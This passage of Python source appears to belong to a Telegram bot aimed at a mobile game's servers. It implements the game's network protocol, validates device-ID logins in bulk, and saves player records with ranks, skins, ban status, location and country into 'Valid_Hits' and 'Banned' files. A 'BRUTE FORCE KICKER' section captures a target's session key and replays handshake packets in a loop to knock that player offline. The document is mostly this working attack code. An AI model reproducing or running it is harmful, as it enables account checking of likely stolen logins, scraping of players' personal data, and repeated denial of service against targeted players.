            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._wv(len(enc)) + enc
        elif isinstance(val, list):
            self._ph(tag, SdpDataType.LIST); self.data += self._wv(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._ph(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._ph(tag, SdpDataType.DICT); self.data += self._wv(len(val))
                for k, v in sorted(val.items()): self._pack_item(0, k); self._pack_item(0, v)
        else: raise Exception("Unsupported type")
    def _unpack_item(self):
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]; tag = hdr & 0xF; dtype = SdpDataType(hdr >> 4); self.offset += 1
        if tag == 15: tag = self._rv()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._rv()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._rv()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._rv().to_bytes(4,'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._rv().to_bytes(8,'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._rv(); raw = self.data[self.offset:self.offset+l]; self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._rv(); return tag, [self._unpack_item()[1] for _ in range(l)]
        if dtype == SdpDataType.DICT:
            l = self._rv(); res = {}
            for _ in range(l):
                _, k = self._unpack_item(); _, v = self._unpack_item(); res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

def sdp_to_plain(o):
    if isinstance(o, SdpStruct): return {k: sdp_to_plain(v) for k, v in o.items()}
    if isinstance(o, dict): return {k: sdp_to_plain(v) for k, v in o.items()}
    if isinstance(o, list): return [sdp_to_plain(v) for v in o]
    if isinstance(o, bytes):
        try: return o.decode('utf-8')
        except: return o.hex()
    return o

# ════════════════════════════════════════════════════════════════
# CONNECTION
# ════════════════════════════════════════════════════════════════

class BaseConnection:
    def __init__(self, host, port, stop_event: Optional[threading.Event] = None):
        self.host = host; self.port = port; self.sequence = 1
        self.socket = None; self.queue = b''
        self.stop_event = stop_event
        self.aborted = False

    def _should_abort(self) -> bool:
        return self.stop_event is not None and self.stop_event.is_set()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try: self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except: pass
        self.socket.settimeout(SOCK_CONNECT_TIMEOUT)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(SOCK_READ_TIMEOUT)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1; self.socket = None

    def __enter__(self):
        self.connect(); return self
    def __exit__(self, *a): self.cleanup()

    def send_data(self, pid, sdp):
        if self._should_abort():
            self.aborted = True
            raise ConnectionError("aborted")
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.sendall(flags.to_bytes(4, 'big') + comp); self.sequence += 1

    def recv_data(self):
        if self._should_abort():
            self.aborted = True
            return None, None
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(8192)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF; ctype = flags >> 24
            while len(self.queue) < size:
                if self._should_abort():
                    self.aborted = True
                    return None, None
                d = self.socket.recv(8192)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]; self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data); pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout:
            return -1, None
        except ConnectionError:
            self.aborted = True
            return None, None
        except:
            return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id, stop_event: Optional[threading.Event] = None):
        super().__init__(SERVER_HOST, SERVER_PORT, stop_event)
        self.device_id = device_id
        parsed = parse_device_id(device_id)
        self.platform  = parsed["platform"]
        self.imei      = parsed["imei"]
        self.android   = parsed["android"]
        self.adid      = parsed["adid"]
        self.channel   = parsed["channel"]
        self.auth_str  = parsed["auth_str"]

    def run(self):
        try:
            log.info(f"[GameLogin] platform={self.platform} id={_mask_uuid(self.device_id)}")
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: self.auth_str,
                2: CLIENT_VERSION, 3: self.channel, 4: LANGUAGE }))
            pid, res = self.recv_data()
            if self.aborted:
                return None, None, "ABORTED"
            if pid == 2 and res:
                acc  = res.get(0)
                zone = res[2][0] if 2 in res else None
                if is_guest_account(acc):
                    return None, None, "UNREGISTERED"
                return acc, zone, "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except ConnectionError:
            return None, None, "ABORTED"
        except Exception as e: return None, None, f"ERROR ({e})"
        finally: self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id, stop_event: Optional[threading.Event] = None):
        super().__init__(SERVER_HOST, SERVER_PORT, stop_event)
        self.device_id = device_id
        parsed = parse_device_id(device_id)
        self.platform  = parsed["platform"]
        self.imei      = parsed["imei"]
        self.android   = parsed["android"]
        self.adid      = parsed["adid"]
        self.channel   = parsed["channel"]
        self.auth_str  = parsed["auth_str"]
        self.account_id = 0; self.session_key = ''; self.zone_id = 0
        self.game_host = ''; self.game_port = 0
        self.ban_status = "Not Banned"; self.ban_end_ts = 0
        self.is_guest = False
        self.debug_responses = []

    def _rec(self, label, req_pid, resp_pid, res):
        self.debug_responses.append({"label": label, "req_pid": req_pid,
                                     "resp_pid": resp_pid,
                                     "data": sdp_to_plain(res) if res else None})

    @staticmethod
    def _coerce_zone(z):
        if z is None: return 0
        if isinstance(z, bool): return int(z)
        if isinstance(z, int): return z
        if isinstance(z, (list, tuple)):
            return GameConnection._coerce_zone(z[0]) if z else 0
        if isinstance(z, dict):
            for k in (0, 1, "0", "id", "zone", "zone_id"):
                if k in z: return GameConnection._coerce_zone(z[k])
            if z: return GameConnection._coerce_zone(next(iter(z.values())))
        try: return int(z)
        except Exception: return 0

    @staticmethod
    def _parse_hostport(raw):
        if raw is None: return None, None
        if isinstance(raw, bytes): raw = raw.decode("utf-8", errors="ignore")
        if isinstance(raw, str):
            if ":" not in raw: return None, None
            host, port = raw.rsplit(":", 1)
            try: return host.strip(), int(port.strip())
            except Exception: return None, None
        if isinstance(raw, dict):
            for v in raw.values():
                if isinstance(v, str) and ":" in v:
                    return GameConnection._parse_hostport(v)
            h = raw.get(1) or raw.get("host") or raw.get("ip") or raw.get(0)
            p = raw.get(2) or raw.get("port")
            if h and p:
                try: return str(h).strip(), int(p)
                except Exception: return None, None
            vals = list(raw.values())
            if len(vals) >= 2:
                try: return str(vals[0]).strip(), int(vals[1])
                except Exception: return None, None
        if isinstance(raw, (list, tuple)) and len(raw) >= 2:
            try: return str(raw[0]).strip(), int(raw[1])
            except Exception: return None, None
        return None, None

    def login_to_login_server(self):
        log.info(f"[GameConnection] platform={self.platform} id={_mask_uuid(self.device_id)}")
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup(); self.host, self.port = SERVER_HOST, SERVER_PORT; self.connect()
        self.send_data(1, SdpStruct({0: self.device_id,
            1: self.auth_str,
            2: CLIENT_VERSION, 3: self.channel, 4: LANGUAGE}))
        for _ in range(4):
            if self._should_abort(): return False
            pid, res = self.recv_data(); self._rec("login", 1, pid, res)
            if self.aborted: return False
            if pid in (-1, None): break
            if pid == 2 and res:
                acc_raw = res.get(0)
                if is_guest_account(acc_raw):
                    self.is_guest = True
                    self.ban_status = "UNREGISTERED"
                    return False
                self.account_id = acc_raw
                self.session_key = res.get(1) or ""
                self.zone_id = self._coerce_zone(res.get(2))
                err = res.get(10, 0)
                if err in (3,4,5,6,100,101,102):
                    self.ban_status = "Banned"; self.ban_end_ts = res.get(20, 0)
                return True
        self.ban_status = f"LOGIN FAILED (last PID: {pid})"
        return False

    def get_game_server(self):
        for attempt in range(3):
            if self._should_abort(): return False
            try:
                self.send_data(5, SdpStruct({0: self.account_id, 1: self.session_key,
                    2: CLIENT_VERSION, 5: self.zone_id, 6: self.channel }))
                for _ in range(8):
                    if self._should_abort(): return False
                    pid, res = self.recv_data(); self._rec("get_server", 5, pid, res)
                    if self.aborted: return False
                    if pid in (-1, None): break
                    if pid == 6 and res:
                        raw = res.get(1) if hasattr(res, "get") else None
                        host, port = self._parse_hostport(raw)
                        if host and port:
                            self.game_host = host; self.game_port = int(port); return True
                        if isinstance(res, dict):
                            for v in res.values():
                                h, p = self._parse_hostport(v)
                                if h and p:
                                    self.game_host = h; self.game_port = p; return True
            except ConnectionError:
                return False
            except Exception as e:
                log.error(f"get_game_server attempt {attempt+1} err: {e}")
            time.sleep(0.2)
        return False

    def connect_to_game_server(self):
        self.cleanup(); self.host, self.port = self.game_host, self.game_port; self.connect()
        self.send_data(10001, SdpStruct({0: self.account_id, 1: self.session_key,
            2: self.zone_id, 4: CLIENT_VERSION, 13: self.channel, 15: self.device_id}))
        for _ in range(20):
            if self._should_abort(): return False
            pid, res = self.recv_data(); self._rec("handshake", 10001, pid, res)
            if self.aborted: return False
            if pid is None or pid == -1: return False
            if pid == 10002: return True
            if pid == 20001 and res:
                self._rec("early_ban_info", 10101, 20001, res)
        return False

    def lookup_player(self, search_value):
        seen = []
        for attempt in range(4):
            if self._should_abort(): return None
            try:
                self.send_data(11153, SdpStruct({1: int(search_value)}))
            except ConnectionError:
                return None
            except Exception as e:
                log.warning(f"lookup send fail attempt {attempt}: {e}")
                break
            for _ in range(14):
                if self._should_abort(): return None
                pid, res = self.recv_data()
                if self.aborted: return None
                seen.append(pid)
                self._rec("lookup_player", 11153, pid, res)
                if pid == 11154: return res
                if pid in (-1, None): break
                if pid == 20001: continue
            time.sleep(0.5)
        log.warning(f"lookup_player empty — pids seen: {seen[-12:]}")
        return None

    def _drain_queue(self):
        self.socket.settimeout(0.2)
        try:
            for _ in range(20):
                try:
                    pid, _res = self.recv_data()
                except Exception:
                    break
                if pid in (-1, None): break
        finally:
            try: self.socket.settimeout(SOCK_READ_TIMEOUT)
            except: pass

    def check_ban_status(self):
        if self.is_guest or is_guest_account(self.account_id):
            return "UNREGISTERED"
        self._drain_queue()
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(6):
            if self._should_abort(): return "ABORTED"
            pid, res = self.recv_data()
            if self.aborted: return "ABORTED"
            self._rec("ban_check", 10101, pid, res)
            if pid == 20002:
                self.ban_status = "Not Banned"
                return self.ban_status
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                b = res[0]
                reason = b.get('ban_reason', '')
                d = b.get('endtime_day','0'); h = b.get('endtime_hour','0')
                m = b.get('endtime_min','0'); s = b.get('endtime_sec','0')
                try:
                    total_ban_seconds = int(d)*86400 + int(h)*3600 + int(m)*60 + int(s)
                except: total_ban_seconds = 0
                if reason and str(reason).strip() and total_ban_seconds > 0:
                    self.ban_status = f"Banned (Reason: {reason} | {d}d {h}h {m}m {s}s)"
                    return self.ban_status
                self.ban_status = "Not Banned"
                return self.ban_status
            if pid in (-1, None):
                break
        return "Not Banned"

# ════════════════════════════════════════════════════════════════
# V2L + EXTRACT
# ════════════════════════════════════════════════════════════════

def get_v2l_status(conn, role_id, zone_id):
    for pid_req, pid_resp_list in [(10208, [10208]), (10145, [10146, 10160]), (10143, [10144])]:
        try:
            conn.send_data(pid_req, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid in pid_resp_list and res:
                    data = dict(res)
                    for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                        val = data.get(tag)
                        if val is None:
                            nested = data.get(tag, {})
                            if isinstance(nested, dict):
                                for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                                    val = nested.get(subtag)
                                    if val is not None: break
                        if val is not None:
                            if isinstance(val, (int, float)):
                                return "Enabled" if int(val) > 0 else "Disabled"
                            if isinstance(val, str):
                                if val.lower() in ("1","true","enabled","yes"): return "Enabled"
                                if val.lower() in ("0","false","disabled","no"): return "Disabled"
        except: pass
    return "N/A"

def extract_player_data(result):
    if not result or 0 not in result: return None
    plist = result.get(0)
    if not isinstance(plist, list) or not plist: return None
    pd = plist[0]
    if not isinstance(pd, dict): return None
    if is_guest_account(pd.get(0)):
        log.info(f"extract_player_data: rejecting guest account {pd.get(0)}")
        return None
    try:
        bc = pd.get(39, pd.get(40, 0))
        bet = pd.get(41, 0)
        if isinstance(bc, int) and bc in _BAN_CODES:
            ban_status = _BAN_CODES[bc]
        else:
            ban_status = "Not Banned"
        ban_end = fmt_ts(bet) if bet else "N/A"
        try: skin_count = int(pd.get(83, 0))
        except: skin_count = 0
        last_login = fmt_ts(pd.get(5, 0))
        llc = pd.get(87); cac = pd.get(97)
        try: hero_count = int(pd.get(4, 0))
        except: hero_count = 0
        try: win = int(pd.get(18, 0))
        except: win = 0
        try: loss = int(pd.get(155, 0))
        except: loss = 0
        total = win + loss
        wr = f"{win/total*100:.2f}%" if total > 0 else "N/A"
        loc = "NOT FOUND"
        ld = pd.get(71)
        if isinstance(ld, list) and len(ld) >= 2: loc = ", ".join(str(x) for x in ld)
        sn = str(pd.get(30, "")).replace("`", "").strip()
        si = str(pd.get(31, "")).strip()
        squad = f"{si} {sn}".strip() if sn else None
        hr = map_rank(pd.get(95)) if pd.get(95) is not None else None
        cr = map_rank(pd.get(8)) if pd.get(8) is not None else None
        cpt = 0
        t136 = pd.get(136, {})
        if isinstance(t136, dict): cpt = t136.get(9, 0)
        try: cpt = int(cpt)
        except: cpt = 0
        ctier = map_collector_point(cpt) if cpt > 0 else None
        heroes_list = []
        t91 = pd.get(91, [])
        if isinstance(t91, list):
            seen = set()
            for hid in t91:
                try: hid_i = int(hid)
                except: continue
                if hid_i in seen: continue
                seen.add(hid_i); heroes_list.append(hero_name(hid_i))
                if len(heroes_list) >= 5: break
        return {
            "nickname": pd.get(2, "Unknown"), "player_id": pd.get(0, "Unknown"),
            "server": pd.get(1, "Unknown"), "level": pd.get(3, 1),
            "ban_status": ban_status, "ban_end": ban_end, "skin_count": skin_count,
            "last_login": last_login,
            "login_country": str(llc) if llc else None,
            "reg_country": str(cac) if cac else None,
            "hero_count": hero_count,
            "location": loc if loc != "NOT FOUND" else None,
            "high_rank": hr, "current_rank": cr,
            "collector_tier": ctier, "collector_point": cpt if cpt > 0 else None,
            "squad": squad, "total_battles": total, "win_rate": wr,
            "hero_history": heroes_list,
        }
    except Exception as e:
        log.error(f"extract_player_data error: {e}"); return None

# ════════════════════════════════════════════════════════════════
# DETAIL CHECK
# ════════════════════════════════════════════════════════════════

def process_detail(device_id, account_id, zone_id, want_debug=False,
                   stop_event: Optional[threading.Event] = None):
    if is_guest_account(account_id):
        return False, None, "unregistered", None
    try:
        with GameConnection(device_id=device_id, stop_event=stop_event) as conn:
            if not conn.login_to_login_server():
                if conn.aborted: return False, None, "aborted", None
                if conn.is_guest or conn.ban_status == "UNREGISTERED":
                    return False, None, "unregistered", (conn.debug_responses if want_debug else None)
                return False, None, "login_failed", (conn.debug_responses if want_debug else None)
            if not conn.get_game_server():
                if conn.aborted: return False, None, "aborted", None
                seen = [r.get("resp_pid") for r in conn.debug_responses if r.get("label") == "get_server"]
                return False, None, f"no_game_server (pids seen: {seen})", (conn.debug_responses if want_debug else None)
            if not conn.connect_to_game_server():
                if conn.aborted: return False, None, "aborted", None
                return False, None, "handshake_failed", (conn.debug_responses if want_debug else None)

            result = conn.lookup_player(account_id)
            debug_bundle = conn.debug_responses if want_debug else None
            if conn.aborted: return False, None, "aborted", debug_bundle

            try: ban_stat = conn.check_ban_status()
            except Exception as e:
                log.warning(f"ban check failed: {e}"); ban_stat = "Not Banned"
            if conn.aborted: return False, None, "aborted", debug_bundle

            if "unregistered" in str(ban_stat).lower():
                return False, None, "unregistered", debug_bundle

            if not result:
                if is_banned_status(ban_stat):
                    return False, None, f"banned:{ban_stat}", debug_bundle
                return False, None, "lookup_empty", debug_bundle

            try: v2l = get_v2l_status(conn, account_id, zone_id)
            except Exception as e:
                log.warning(f"v2l check failed: {e}"); v2l = "N/A"
            if conn.aborted: return False, None, "aborted", debug_bundle

            extracted = extract_player_data(result)
            if not extracted:
                return False, None, "parse_failed", debug_bundle

            ext_ban = extracted.get("ban_status", "Not Banned")
            if is_banned_status(ban_stat) and not is_banned_status(ext_ban):
                final_ban = ban_stat
            elif is_banned_status(ext_ban):
                final_ban = ext_ban
            else:
                final_ban = "Not Banned"

            player_data = {
                "nickname": extracted.get("nickname"), "level": extracted.get("level"),
                "skin_count": extracted.get("skin_count"), "hero_count": extracted.get("hero_count"),
                "matches": extracted.get("total_battles"),
                "current_rank": extracted.get("current_rank") or "Unranked",
                "highest_rank": extracted.get("high_rank") or "N/A",
                "ban_status": final_ban,
                "v2l_status": v2l,
                "device_id": device_id, "account_id": account_id, "zone_id": zone_id,
                "login_country": extracted.get("login_country"),
                "reg_country": extracted.get("reg_country"),
                "collector_tier": extracted.get("collector_tier"),
                "collector_point": extracted.get("collector_point"),
                "location": extracted.get("location"),
                "last_login": extracted.get("last_login"),
                "squad": extracted.get("squad"),
                "hero_history": extracted.get("hero_history", []),
                "win_rate": extracted.get("win_rate"),
            }
            return True, player_data, "ok", debug_bundle
    except Exception as e:
        log.error(f"process_detail error: {e}")
        return False, None, f"exception:{e}", None

# ════════════════════════════════════════════════════════════════
# BRUTE FORCE ENGINE  (admin-only)
# ════════════════════════════════════════════════════════════════

_bf_profiles: Dict[int, Dict[str, Any]] = {}
_bf_profiles_lock = threading.Lock()
_bf_stop_flags: Dict[int, threading.Event] = {}
_bf_lock = threading.Lock()

def fetch_session_profile(device_id: str,
                          stop_event: Optional[threading.Event] = None) -> Optional[Dict[str, Any]]:
    """Login, get game server, verify account, return a BF-ready profile."""
    try:
        acc, zone, stat = GameLogin(device_id, stop_event=stop_event).run()
        if not acc or not zone:
            log.info(f"fetch_session_profile: login failed for {_mask_uuid(device_id)} — {stat}")
            return None

        conn = GameConnection(device_id=device_id, stop_event=stop_event)
        try:
            if not conn.login_to_login_server():
                log.info("fetch_session_profile: GameConnection login failed")
                return None
            if not conn.get_game_server():
                log.info("fetch_session_profile: get_game_server failed")
                return None
            if not conn.connect_to_game_server():
                log.info("fetch_session_profile: game server handshake failed")
                return None

            try: ban_stat = conn.check_ban_status()
            except Exception as e:
                log.warning(f"fetch_session_profile ban check failed: {e}")
                ban_stat = "Not Banned"

            result = conn.lookup_player(acc)
            pd = extract_player_data(result) if result else {}
            pd = pd or {}

            return {
                "device_id":    device_id,
                "account_id":   acc,
                "zone_id":      zone,
                "session_key":  conn.session_key,
                "game_host":    conn.game_host,
                "game_port":    conn.game_port,
                "gs_info":      f"{conn.game_host}:{conn.game_port}",
                "nickname":     pd.get("nickname") or f"Player_{acc}",
                "level":        pd.get("level", 1),
                "rank":         pd.get("current_rank") or "Unranked",
                "highest_rank": pd.get("highest_rank") or "N/A",
                "skin_count":   pd.get("skin_count", 0),
                "hero_count":   pd.get("hero_count", 0),
                "ban_status":   ban_stat,
                "platform":     conn.platform,
                "channel":      conn.channel,
            }
        finally:
            conn.cleanup()
    except Exception as e:
        log.error(f"fetch_session_profile error: {e}")
        return None

def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    """Send one PID-10001 kick to the target's game server. Returns (ok, latency_ms, desc)."""
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile["game_host"], profile["game_port"]))

        channel = profile.get("channel") or (
            CHANNEL_IOS if detect_platform(profile["device_id"]) == "ios" else CHANNEL_AND
        )
        body_struct = SdpStruct({
            0:  profile["account_id"],
            1:  profile["session_key"],
            2:  profile["zone_id"],
            4:  CLIENT_VERSION,
            13: channel,
            15: profile["device_id"],
        }).data
        pkt   = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp  = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.sendall(flags.to_bytes(4, 'big') + comp)

        q = b''
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        got_ack = False
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            got_ack = len(q) >= sz

        elapsed_ms = (time.time() - t0) * 1000
        try: sock.close()
        except: pass
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)

def run_bf_job(job: dict, loop, app):
    user_id  = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    profile  = job["profile"]; loops = job["loops"]; delay = job["delay"]
    stop_ev  = job["stop_event"]
    count = 0; success_count = 0; fail_count = 0; latencies = []
    bf_start = time.time()
    _last = [0.0]

    def upd(force=False):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        elapsed = int(time.time() - bf_start)
        avg_lat = sum(latencies) / len(latencies) if latencies else 0
        succ_pct = (success_count / max(count, 1) * 100)
        speed = count / max(elapsed, 1)
        loop_str = f"{count}/{loops}" if loops > 0 else f"{count}/∞"
        pct = (count / loops * 100) if loops > 0 else (count % 100)
        text = (
            f"⚡  *BRUTE FORCE KICKER*\n{LINE_HEAVY}\n"
            f"`{_bar(pct, 22)}` *{pct:5.1f}%*\n\n"
            f"{panel_title('Target')}\n"
            f"┣ 👤 Nick : `{_esc(profile['nickname'])}`\n"
            f"┣ 🆔 Acc  : `{profile['account_id']}`\n"
            f"┗ 🌐 Srv  : `{profile['gs_info']}`\n\n"
            f"{panel_title('Progress')}\n"
            f"{_stat('🔄','Loops', loop_str)}\n"
            f"{_stat('✅','Success', f'{success_count} ({succ_pct:.1f}%)')}\n"
            f"{_stat('❌','Failed', fail_count)}\n"
            f"{_stat('⚡','Avg Lat', f'{avg_lat:.0f}ms')}\n"
            f"{_stat('🏃','Speed', f'{speed:.2f} kick/s')}\n"
            f"{_stat('⏱','Elapsed', _fmt_secs(elapsed), last=True)}\n"
            f"{LINE_HEAVY}\n👑 {BRAND}"
        )
        kb = [[InlineKeyboardButton("🛑  Stop BF", callback_data=f"stop_bf_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except Exception as e:
            log.debug(f"bf upd skipped: {e}")

    try:
        while not stop_ev.is_set():
            count += 1
            ok, lat, desc = send_session_kick(profile)
            latencies.append(lat)
            if ok: success_count += 1
            else:  fail_count    += 1
            upd()
            if loops > 0 and count >= loops: break
            if delay > 0:
                stop_ev.wait(timeout=delay)
    except Exception as e:
        log.error(f"BF loop error: {e}")

    upd(force=True)

    elapsed  = int(time.time() - bf_start)
    avg_lat  = sum(latencies) / len(latencies) if latencies else 0
    succ_pct = (success_count / max(count, 1) * 100)
    speed    = count / max(elapsed, 1)
    summary = (
        f"📊  *BRUTE FORCE SUMMARY*\n{LINE_HEAVY}\n\n"
        f"{panel_title('Target')}\n"
        f"┣ 👤 Nick : `{_esc(profile['nickname'])}`\n"
        f"┣ 🆔 Acc  : `{profile['account_id']}`\n"
        f"┗ 🌐 Srv  : `{profile['gs_info']}`\n\n"
        f"{panel_title('Results')}\n"
        f"{_stat('🔄','Loops', count)}\n"
        f"{_stat('✅','Success', f'{success_count} ({succ_pct:.1f}%)')}\n"
        f"{_stat('❌','Failed', fail_count)}\n"
        f"{_stat('⚡','Avg Lat', f'{avg_lat:.0f}ms')}\n"
        f"{_stat('🏃','Speed', f'{speed:.2f} kick/s')}\n"
        f"{_stat('⏱','Duration', _fmt_secs(elapsed), last=True)}\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )
    time.sleep(0.5)
    edited = False
    for _ in range(3):
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown"), loop)
            fut.result(timeout=30); edited = True; break
        except: time.sleep(1)
    if not edited:
        try:
            asyncio.run_coroutine_threadsafe(
                app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown"), loop)
        except: pass

    with _bf_lock: _bf_stop_flags.pop(user_id, None)
    with _bf_profiles_lock: _bf_profiles.pop(user_id, None)
    with job_lock: active_jobs.pop(user_id, None)

# ════════════════════════════════════════════════════════════════
# FILE HELPERS + SAVE
# ════════════════════════════════════════════════════════════════

def _safe(s, n=40):
    s = re.sub(r'[^A-Za-z0-9_.\-]', '_', str(s or "unknown"))
    return s[:n] or "unknown"

def _lv_key(level):
    for mn, mx, _, key in LEVEL_BRACKETS:
        if mn <= level <= mx: return key
    return None

def _lv_file(lv_dir, level):
    for mn, mx, fn, _ in LEVEL_BRACKETS:
        if mn <= level <= mx: return os.path.join(lv_dir, fn)
    return None

def _sk_key(skin):
    for mn, mx, _, key in SKIN_BRACKETS:
        if mn <= skin <= mx: return key
    return None

def _sk_file(sk_dir, skin):
    for mn, mx, fn, _ in SKIN_BRACKETS:
        if mn <= skin <= mx: return os.path.join(sk_dir, fn)
    return None

def _line_row(did, p):
    hh = p.get("hero_history") or []
    lh = hh[0] if hh else "N/A"
    return (f"Device ID: {did} | Name: {p.get('nickname','N/A')} | "
            f"Role ID: {p.get('account_id','N/A')} | Server ID: {p.get('zone_id','N/A')} | "
            f"Level: {p.get('level','N/A')} | Ban: {p.get('ban_status','N/A')} | "
            f"Skin: {p.get('skin_count','N/A')} | Last Login: {p.get('last_login','N/A')} | "
            f"Rank: {p.get('current_rank','N/A')} | High Rank: {p.get('highest_rank','N/A')} | "
            f"Win Rate: {p.get('win_rate','N/A')} | Heroes: {p.get('hero_count',0)} | "
            f"Matches: {p.get('matches',0)} | Last Hero: {lh} | "
            f"Squad: {p.get('squad') or '—'} | Collector: {p.get('collector_tier','None')}")

HIT_COUNTERS = {'sultan':0,'banned':0,'warrior':0,'elite':0,'master':0,'gm':0,'epic':0,'legend':0,'mythic':0}
COUNTER_LOCK = threading.Lock()
save_lock = threading.Lock()

def save_account_v2(account_info, player_data, out_dir=None):
    base = out_dir if out_dir else OUTPUT_DIR
    device = account_info.get('Device id', ''); acc = account_info.get('role_id', '?')
    zone = account_info.get('zone_id', '?'); ban_stat = player_data.get('ban_status', 'Not Banned')

    if is_guest_account(acc): return None
    bs_low = str(ban_stat).lower()
    if "unregistered" in bs_low or "guest" in bs_low: return None

    is_banned = is_banned_status(ban_stat)

    if is_banned:
        bf = os.path.join(base, "Banned", "banned_accounts.txt")
        os.makedirs(os.path.dirname(bf), exist_ok=True)
        with save_lock:
            with open(bf, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK: HIT_COUNTERS['banned'] += 1
        return None
    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", "", "n/a"): return None
    player_data['account_id'] = acc; player_data['zone_id'] = zone
    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_cat = get_rank_category(cur_rank)
    skin_cnt = player_data.get('skin_count', 0) or 0
    with COUNTER_LOCK:
        if rank_cat in HIT_COUNTERS: HIT_COUNTERS[rank_cat] += 1
        if skin_cnt >= 200: HIT_COUNTERS['sultan'] += 1
    return player_data

def write_session_card(session_dir, device, acc, zone, pd, is_banned):
    try:
        if is_guest_account(acc): return None
        nick = pd.get("nickname", "unknown")
        real_ban = is_banned_status(pd.get("ban_status", ""))
        if is_banned and not real_ban: is_banned = False
        if is_banned:
            folder = os.path.join(session_dir, "Banned")
            fname = f"{_safe(acc)}_{_safe(zone)}_{_safe(nick)}.txt"
            body = render_card(device, pd) + f"\n\nBAN STATUS: {pd.get('ban_status','UNKNOWN')}\n"
        else:
            low = str(nick).lower()
            if low in ("", "n/a", "guest", "unknown") or low.startswith("player_"): return None
            folder = os.path.join(session_dir, "Valid_Hits")
            fname = f"{_safe(acc)}_{_safe(zone)}_{_safe(nick)}.txt"
            body = render_card(device, pd)
        os.makedirs(folder, exist_ok=True)
        with open(os.path.join(folder, fname), "w", encoding="utf-8") as f: f.write(body)
        if not is_banned:
            row = _line_row(device, pd)
            try: lvl = int(pd.get("level", 0))
            except: lvl = 0
            try: skin = int(pd.get("skin_count", 0))
            except: skin = 0
